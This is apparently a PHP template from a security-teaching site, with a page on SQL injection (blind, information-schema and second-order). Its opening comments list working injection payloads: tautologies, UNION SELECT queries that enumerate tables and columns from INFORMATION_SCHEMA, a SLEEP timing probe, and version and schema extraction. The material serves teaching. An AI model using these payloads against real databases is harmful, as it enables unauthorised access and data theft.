<?php

  require_once "templates/header.php";

  //%' OR '%
  //%' OR '1' = '1
  //prints everything

  //sql' OR title LIKE 'cross
  //prints cross-site scripting

  //' union select title FROM home_buttons -- '
  //title can be replaced with php_page, id, etc

  //sql' OR title LIKE 'cross
  //prints cross-site scripting

  //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_TABLES -- '
  //prints names of all tables

  //sleep
  //sql'  UNION SELECT SLEEP(3)-- '

  //gets columns of home table (43 from TABLE_ID in SYS_TABLES)
  //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_COLUMNS WHERE TABLE_ID = '43' -- '

  //gets db version
  //%sql' UNION SELECT version()-- '

  //gets schema of current
  //%sql' UNION SELECT schema()-- '
 ?>


<html>
  <head>
    <link rel="stylesheet" type="text/css" href="/public/assets/css/page_template.css">
  </head>
  <body>

  <div class="video-container">
    <video autoplay muted loop class="default-vid">
      <source src="/img/video/sql-injection.mp4" type="video/mp4">
    </video>
  </div>
    <div class="colour-overlay"></div>

    <div class="subheadings">
      <h1>Injection attacks</h1>
      <!-- Blind | exploits | second order (Maybe as buttons)-->
      <p>Blind injection</p>
      <p>Information schema exploits</p>
      <p>Second order injection</p>
      <!-- Paragraph explaining sql -->
    </div>
  </body>
</html>
